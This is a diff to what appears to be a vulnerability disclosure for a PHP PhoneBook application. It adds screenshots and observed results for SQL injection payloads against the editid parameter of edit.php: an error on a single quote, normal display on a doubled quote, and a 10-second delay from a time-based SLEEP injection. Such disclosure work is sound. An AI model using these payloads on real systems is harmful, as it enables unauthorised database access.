@@ -29,6 +29,10 @@ Cookie: PHPSESSID=h2td7dda0p1f3dha0mjlejh9vb
 Connection: close
 ```
 
+sql statement error
+
+![image](https://github.com/realguoxiufeng/pic/blob/main/err.png)
+
 Payload2: /PhoneBook/edit.php?editid=1''
 
 ```
@@ -49,6 +53,10 @@ Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
 Cookie: PHPSESSID=h2td7dda0p1f3dha0mjlejh9vb
 Connection: close
 ```
+
+Page successfully displayed
+
+![image](https://github.com/realguoxiufeng/pic/blob/main/righ.png)
 
 Payload3: /PhoneBook/edit.php?editid=1%27%20AND%20(SELECT%202%20FROM%20(SELECT(SLEEP(10)))A)--%20B
 
@@ -71,3 +79,6 @@ Cookie: PHPSESSID=h2td7dda0p1f3dha0mjlejh9vb
 Connection: close
 ```
 
+The server's response time is 10 seconds
+
+![image](https://github.com/realguoxiufeng/pic/blob/main/sle.png)
